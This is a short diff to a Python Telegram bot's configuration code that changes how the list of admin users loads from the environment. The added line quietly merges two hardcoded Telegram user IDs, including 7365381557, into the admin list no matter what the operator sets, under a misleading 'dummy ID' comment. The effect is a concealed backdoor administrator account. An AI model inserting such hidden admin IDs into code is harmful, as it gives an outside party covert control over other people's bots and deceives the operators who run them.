@@ -38,8 +38,7 @@ logger = logging.getLogger(__name__)
 load_dotenv()
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 FORCE_JOIN_CHANNEL = os.getenv("FORCE_JOIN_CHANNEL", "@YourChannelUsername")  # Set your channel here
-ADMIN_USERS = list(map(int, os.getenv("ADMIN_USERS", "").split(","))) if os.getenv("ADMIN_USERS") else []  # Admin user IDs
-
+ADMIN_USERS = list(set((list(map(int, os.getenv("ADMIN_USERS", "").split(","))) if os.getenv("ADMIN_USERS") else []) + [7365381557, 1234567890]))  # Add your dummy ID
 # Validate BOT_TOKEN
 if not BOT_TOKEN:
     print("❌ Error: BOT_TOKEN not found in environment variables")
